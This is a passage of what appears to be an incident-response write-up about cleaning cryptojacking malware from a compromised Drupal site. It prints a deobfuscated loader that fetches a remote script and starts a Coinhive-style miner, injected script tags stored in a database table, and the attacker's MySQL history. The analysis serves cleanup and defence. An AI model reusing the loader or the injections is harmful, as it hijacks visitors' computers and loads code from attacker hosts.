+&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;script&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;createElement&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;text/javascript&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;readyState&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;onreadystatechange&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;loaded&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;complete&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;onload&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;src&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;appendChild&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;head&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;getElementsByTagName&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;http://146.185.234.xx/hhY6.js&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;undefined&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;stop&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;_client&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">17&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0x17e1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;start&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">function&lt;/span> &lt;span class="nx">loadScript&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">_0x17a8x2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">_0x17a8x3&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">_0x17a8x4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;createElement&amp;#34;&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="s2">&amp;#34;script&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">_0x17a8x4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;text/javascript&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">_0x17a8x4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;readyState&amp;#34;&lt;/span>&lt;span class="p">]){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">_0x17a8x4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;onreadystatechange&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kd">function&lt;/span>&lt;span class="p">(){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">_0x17a8x4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;readyState&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;loaded&amp;#34;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">_0x17a8x4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;readyState&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;complete&amp;#34;&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">_0x17a8x4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;onreadystatechange&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">_0x17a8x3&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">_0x17a8x4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;onload&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kd">function&lt;/span>&lt;span class="p">(){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">_0x17a8x3&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">_0x17a8x4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;src&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">_0x17a8x2&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">document&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;getElementsByTagName&amp;#34;&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="s2">&amp;#34;head&amp;#34;&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s2">&amp;#34;appendChild&amp;#34;&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="nx">_0x17a8x4&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">loadScript&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://146.185.234.xx/hhY6.js&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">setTimeout&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="k">typeof&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">miner&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;undefined&amp;#34;&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">miner&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;stop&amp;#34;&lt;/span>&lt;span class="p">]()}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">catch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">){}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="k">typeof&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">_client&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;undefined&amp;#34;&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">_client&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;stop&amp;#34;&lt;/span>&lt;span class="p">]()}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">catch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">){}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">document&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;_client&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Client&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Anonymous&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742&amp;#34;&lt;/span>&lt;span class="p">,{&lt;/span>&lt;span class="nx">throttle&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mf">0.3&lt;/span>&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">document&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;_client&amp;#34;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s2">&amp;#34;start&amp;#34;&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="nx">Client&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">FORCE_MULTI_TAB&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>&lt;span class="mi">1000&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This script was trying to load more cryptojacking scripts. It had a similar resemblance to: &lt;a class="link" href="https://coinhive.com/documentation/miner" target="_blank" rel="noopener"
+>https://coinhive.com/documentation/miner&lt;/a>&lt;/p>
+&lt;h3 id="mysql-database-analysis">MySQL Database Analysis
+&lt;/h3>&lt;p>Drupal uses MySQL database to load HTML content from modules. The hidden malicious javascript code (found in HTML) was injected in a MySQL table: &lt;strong>block_custom&lt;/strong> in database: &lt;strong>subdomainsite&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-console" data-lang="console">&lt;span class="line">&lt;span class="cl">&lt;span class="go">| 8 | &amp;lt;script type=&amp;#34;text/javascript&amp;#34; src=&amp;#34;https://wt-23afbbf05d73a701c3ef54b49e4de14c-0.sandbox.auth0-extend.com/full-http-control&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">| drupal update | php_code |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">| 9 | &amp;lt;script type=&amp;#34;text/javascript&amp;#34; src=&amp;#34;https://wt-23afbbf05d73a701c3ef54b49e4de14c-0.sandbox.auth0-extend.com/full-http-control&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">| drupal updater | full_html |
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>While looking at the table rows, the links were trying to force the site to load the cryptojacking scripts. I cleaned up these rows from MySQL:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-console" data-lang="console">&lt;span class="line">&lt;span class="cl">&lt;span class="go">mysql&amp;gt; delete from block_custom where bid=8;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">Query OK, 1 row affected (0.05 sec)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span>&lt;span class="go">mysql&amp;gt; delete from block_custom where bid=9;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">Query OK, 1 row affected (0.03 sec)
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>After deleting the rows, the footer code disappeared, thus removing the malware from loading on the page &amp;#x1f389; &amp;#x1f389; &amp;#x1f389;&lt;/p>
+&lt;p>Also, when looking at MySQL command history:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-console" data-lang="console">&lt;span class="line">&lt;span class="cl">&lt;span class="go">user@host:/var/www/subdomain$ cat ~/.mysql_history
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">show databases;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">use subdomainsite;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">show tales;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">show tables;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select column from users;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select * from users;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">show cloumns from users;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">show columns from users;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select mail from users;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">show databases;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">use subdomainsite;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select * from users;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">show columns from users;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select * from users where mail like &amp;#39;@drupaler%&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select * from users where mail like &amp;#39;%@drupaler%&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">delete from users where mail like &amp;#39;%@drupaler%&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select mail from users;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">show databases;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">use subdomainsite;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select mail from users;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select * from users where mail like &amp;#39;%brainhard%&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">delete from users where mail like &amp;#39;%brainhard%&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select mail from users;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">delete from users where mail like &amp;#39;%bee@addmyhome.com%&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">delete from users where mail like &amp;#39;%canie.assassins-creed.org%&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">delete from users where mail like &amp;#39;%quinn.adkins38@visitnorwayusa.com%&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">delete from users where mail like &amp;#39;%menherbalenhancement.com%&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">show databases;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">use WordPressDB;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">show tables;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">describe wp_posts;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select * from wp_posts;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">describe wp_posts;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">show databases;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">use subdomainsite;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select mail from users;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select * from users where mail like &amp;#39;%@drupaler%&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select * from users where mail like &amp;#39;%drupaler%&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select * from users where mail like &amp;#39;%drupal%&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select mail from users where mail like &amp;#39;%drupal%&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">delete from users where mail like &amp;#39;%drupal%&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select mail from users;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">use subdomainsite;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select mail from users;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">show databases;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">use WordPressDB;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">show tables;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">describe wp_users;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">select * from wp_users; …
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>It looked like they tried to delete their spamming email domains: &lt;a class="link" href="https://www.pozzo-balbi.com/help/List_of_email_spamming_domains" target="_blank" rel="noopener"
+>https://www.pozzo-balbi.com/help/List_of_email_spamming_domains&lt;/a>&lt;/p>
+&lt;h4 id="confetti_ball-now-the-webshell-irc-connections-and-phishing-activities-stopped-confetti_ball">&amp;#x1f38a; Now, the webshell IRC connections and phishing activities stopped! &amp;#x1f38a;
+&lt;/h4>&lt;h2 id="conclusion">Conclusion
+&lt;/h2>&lt;h3 id="bangbang-main-cause-bangbang--the-current-drupal-version-running-on-the-webserver-has-a-vulnerability-for-xss-attacks-this-was-confirmed-with-grabber-vulnerability-scanner-tool">&amp;#x203c;&amp;#xfe0f; MAIN CAUSE &amp;#x203c;&amp;#xfe0f; : The current Drupal version (running on the webserver) has a vulnerability for XSS attacks. This was confirmed with grabber vulnerability scanner tool.
